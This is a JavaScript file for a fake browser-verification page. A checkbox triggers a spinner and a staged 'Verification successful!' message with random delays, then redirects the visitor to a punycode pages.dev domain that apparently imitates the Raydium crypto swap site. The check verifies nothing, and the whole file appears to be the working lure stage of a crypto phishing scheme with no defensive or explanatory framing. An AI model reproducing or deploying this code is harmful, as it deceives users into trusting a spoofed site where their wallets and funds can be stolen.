document.addEventListener('DOMContentLoaded', function() {
    const checkbox = document.getElementById('botCheck');
    const verificationBox = document.querySelector('.verification-box');
    const loadingSpinner = document.getElementById('loadingSpinner');
    const checkboxContainer = document.querySelector('.checkbox-container');
    
    // 
    const redirectUrl = 'https://xn--rydium-wc8b.pages.dev/swap.html';
    
    checkbox.addEventListener('change', function() {
        if (this.checked) {
            // 
            showLoadingState();
            
            // 
            setTimeout(() => {
                // 
                showSuccessState();
                
                // 
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 1000);
            }, 2000 + Math.random() * 1000); 
        }
    });
    
    function showLoadingState() {
        // 
        checkboxContainer.style.display = 'none';
        loadingSpinner.style.display = 'block';
        
        // 
        verificationBox.style.borderColor = '#f48c06';
        
        // 
        updateInfoText('Checking your browser...', 'This may take a few seconds.');
    }
    
    function showSuccessState() {
        // 
        loadingSpinner.style.display = 'none';
        
        // 
        verificationBox.classList.add('verification-success');
        
        // 
        const successIcon = document.createElement('div');
        successIcon.innerHTML = `
            <div style="display: flex; align-items: center; justify-content: center; gap: 0.75rem; font-size: 1.1rem; font-weight: 500; color: #059669;">
                <div style="width: 24px; height: 24px; background: #10b981; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
                    <span style="color: white; font-size: 14px; font-weight: bold;">✓</span>
                </div>
                Проверка пройдена успешно
            </div>
        `;
        
        // 
        const verificationContent = verificationBox.querySelector('.checkbox-container') || verificationBox.querySelector('#loadingSpinner').parentNode;
        verificationContent.innerHTML = '';
        verificationContent.appendChild(successIcon);
        
        // 
        updateInfoText('Verification successful!', 'Redirecting you to the requested page...');
    }
    
    function updateInfoText(line1, line2) {
        const infoText = document.querySelector('.info-text');
        infoText.innerHTML = `
            <p>${line1}</p>
            <p>${line2}</p>
        `;
    }
    
    // 
    const checkboxLabel = document.querySelector('.checkbox-label');
    checkboxLabel.addEventListener('mouseenter', function() {
        if (!checkbox.checked) {
            this.style.transform = 'scale(1.02)';
            this.style.transition = 'transform 0.2s ease';
        }
    });
    
    checkboxLabel.addEventListener('mouseleave', function() {
        this.style.transform = 'scale(1)';
    });
    
    // 
    document.body.style.opacity = '0';
    setTimeout(() => {
        document.body.style.transition = 'opacity 0.5s ease';
        document.body.style.opacity = '1';
    }, 100);
    
    // 
    checkbox.addEventListener('click', function(e) {
        if (this.hasAttribute('data-processing')) {
            e.preventDefault();
            return false;
        }
        
        if (this.checked) {
            this.setAttribute('data-processing', 'true');
        }
    });
});

